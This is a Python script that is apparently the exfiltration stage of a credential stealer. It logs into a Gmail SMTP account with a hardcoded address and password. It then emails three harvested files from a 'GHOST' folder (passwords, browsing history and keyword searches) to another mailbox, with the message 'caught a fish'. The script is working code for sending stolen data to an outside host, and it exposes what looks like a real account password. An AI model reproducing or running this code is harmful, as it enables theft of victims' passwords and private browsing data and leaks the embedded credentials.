import smtplib

from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders


email_user = 'samiulextreem@gmail.com'
email_password = 'senbunzakura_kageoshi'
email_send = 'samiulextreem@hotmail.com'


subject = 'subject'

msg = MIMEMultipart()

body = 'Hi there,caught a fish'
msg.attach(MIMEText(body,'plain'))





filename='GHOST/password.csv'
attachment  =open(filename,'rb')

part = MIMEBase('application','octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition',"attachment; filename= "+filename)

msg.attach(part)
text = msg.as_string()





server = smtplib.SMTP('smtp.gmail.com',587)
server.starttls()
server.login(email_user,email_password)


server.sendmail(email_user,email_send,text)
server.quit()







subject = 'subject'

msg = MIMEMultipart()

body = 'Hi there,caught a fish'
msg.attach(MIMEText(body,'plain'))





filename='GHOST/history.csv'
attachment  =open(filename,'rb')

part = MIMEBase('application','octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition',"attachment; filename= "+filename)

msg.attach(part)
text = msg.as_string()





server = smtplib.SMTP('smtp.gmail.com',587)
server.starttls()
server.login(email_user,email_password)


server.sendmail(email_user,email_send,text)
server.quit()







subject = 'subject'

msg = MIMEMultipart()

body = 'Hi there,caught a fish'
msg.attach(MIMEText(body,'plain'))





filename='GHOST/keyword.csv'
attachment  =open(filename,'rb')

part = MIMEBase('application','octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition',"attachment; filename= "+filename)

msg.attach(part)
text = msg.as_string()





server = smtplib.SMTP('smtp.gmail.com',587)
server.starttls()
server.login(email_user,email_password)


server.sendmail(email_user,email_send,text)
server.quit()


print('#### job done ####')